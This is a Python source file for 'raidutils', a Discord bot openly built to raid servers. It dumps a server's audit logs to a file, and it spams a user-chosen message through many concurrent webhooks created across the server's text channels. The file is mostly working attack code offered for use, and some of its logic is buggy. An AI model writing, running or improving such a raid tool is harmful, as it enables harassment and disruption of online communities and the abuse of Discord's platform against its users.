# raidutils
# a bot that allows raiding discord servers via webhook spamming
# code by superwhiskers, licenced under the agpl
import discord, sys, random, string, time, asyncio, json

# variable definitions
client = discord.Client()
channels = None
cfg = None
try:
    with open("config.example.json", "r") as cfgFile:
        cfg = json.load(cfgFile)
except FileNotFoundError:
    print(
        'take "config.example.json", rename it to "config.json" and edit the config before running the client')

# the part of the bot that does what you see and love about raidutils
async def webhook_handler(message, webhook_name, avatar_url):
    global channels
    channel = random.choice(channels)
    hook = await channel.create_webhook(name=webhook_name, avatar=None)
    while True:
        try:
            await hook.send(message, avatar_url=avatar_url)
            time.sleep(1)
        except:
            await hook.delete()
            hook = await channel.create_webhook(name=webhook_name, avatar=None)
        return

# ready event handler
@client.event
async def on_ready():
    try:
        print(f"logged in as { client.user }...")
        server = client.guilds
        for x in range(0, len(server)):
            print(f"{ x }: { server[x].name }")
        server = server[int(input("select a server: "))]
        while True:
            print("------------------------------------")
            print(" raid-utils v1 | by superwhiskers   ")
            print("------------------------------------")
            print("                                    ")
            print(" (1) - dump audit logs              ")
            print(" (2) - spam a message in the server ")
            print(" (3) - exit                         ")
            print("                                    ")
            print("------------------------------------")
            option = input(": ")
            if option == "1":
                print("dumping audit logs...")
                log = ""
                async for entry in server.audit_logs():
                    log += f"""
~~ entry ~~
user: { entry.user }
action: { entry.action }
target: { entry.target }
reason: { entry.reason }
timestamp: { entry.created_at }
category: { entry.category }
extra: { entry.extra }
before: { entry.before }
after: { entry.after }
"""
                with open("audit.log", "a+", -1, "utf-8-sig") as myfile:
                    sanitized_log = "".join(filter(lambda x: x in string.printable, log))
                    myfile.write(sanitized_log)

            elif option == "2":
                code = str(random.randint(100, 999))
                print("are you sure? this will most definitely get you and the bot banned")
                print(f"enter the following code to perform this action: { code }")
                confirmation = input(": ")
                if code == confirmation:
                    print("how many simultaneous webhooks shall i spawn?")
                    hooks = input(": ")
                    print("what should the webhooks be named?")
                    name = input(": ")
                    print("what should the message be?")
                    message = input(": ")
                    print("what should the url for the avatar be?")
                    avatar_url = input(": ")
                    print("okay, beginning spam...")
                    global channels
                    channels = []
                    for x in server.channels:
                        if type(x) == discord.TextChannel:
                            channels.append(x)
                    loop = asyncio.get_event_loop()
                    tasks = []
                    for x in range(int(hooks)):
                        tasks.append(asyncio.ensure_future(webhook_handler(message, name, avatar_url)))
                    loop.run_until_complete(asyncio.wait(tasks))
                    loop.close()
                    loop.run_until_complete(asyncio.wait(tasks))
                    loop.close()
                else:
                    print("incorrect code...")

            elif option == "3":
                sys.exit(0)
    except RuntimeError:
        print()

if __name__ == "__main__":
    client.run(cfg["token"], bot=cfg["bot"])
